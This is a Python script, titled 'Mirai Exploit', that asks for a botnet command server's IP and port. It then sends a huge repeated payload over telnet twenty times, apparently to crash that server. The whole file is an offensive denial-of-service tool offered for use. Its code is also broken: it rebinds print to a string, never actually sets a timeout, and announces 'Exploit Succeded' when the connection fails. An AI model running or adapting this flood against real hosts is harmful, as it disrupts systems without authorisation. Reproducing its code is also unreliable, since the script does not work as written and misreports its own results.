import telnetlib
import socket
import os
os.system("clear")
print = ("Welcome To The Mirai Exploit.")

host = str(input("Enter CNC IP: "))
port = int(input("Enter CNC Port: "))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout
timeout = 50

crashstring = str(input("Enter Payload (no numbers): "))*9999 #  custom payload 
try:
    with telnetlib.Telnet(host, port, timeout) as session:
        print("Payload Multiplyer X1")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X2")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X3")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X4")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X5")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X6")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X7")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X8")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X9")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X10")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X11")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X12")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X13")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X14")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X15")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X16")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X17")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X18")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X19")
        session.write("{}".format(crashstring).encode('ascii'))
        print("Payload Multiplyer X20")
        session.write("{}".format(crashstring).encode('ascii'))



except Exception:
    try:
        result = sock.connect_ex((host,port))
        if result == 0:
            print("Exploit Failed! Try again")
        else:
            print("Exploit Succeded Payload sent!")
    except:
        print("Exploit Succeded Payload sent!")
